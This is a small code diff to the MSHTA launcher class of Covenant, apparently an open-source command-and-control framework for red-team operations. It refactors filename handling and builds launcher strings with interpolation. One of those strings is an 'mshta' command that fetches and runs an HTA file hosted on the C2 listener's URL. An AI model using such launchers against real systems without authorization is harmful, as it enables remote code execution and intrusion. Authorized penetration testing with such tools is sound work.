@@ -6,6 +6,7 @@ using System;
 using System.Linq;
 using Microsoft.CodeAnalysis;
 
+using Covenant.Core;
 using Covenant.Models.Listeners;
 
 namespace Covenant.Models.Launchers
@@ -21,9 +22,11 @@ namespace Covenant.Models.Launchers
             this.CompressStager = false;
         }
 
+        public override string GetFilename() => Utilities.GetSanitizedFilename(this.Name) + ".hta";
+
         protected override string GetLauncher()
         {
-            string launcher = "mshta" + " " + "file.hta";
+            string launcher = $"mshta {this.GetFilename()}";
             this.LauncherString = launcher;
             return this.LauncherString;
         }
@@ -34,7 +37,7 @@ namespace Covenant.Models.Launchers
             if (httpListener != null)
             {
 				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
-                string launcher = "mshta" + " " + hostedLocation;
+                string launcher = $"mshta {hostedLocation}";
                 this.LauncherString = launcher;
                 return launcher;
             }
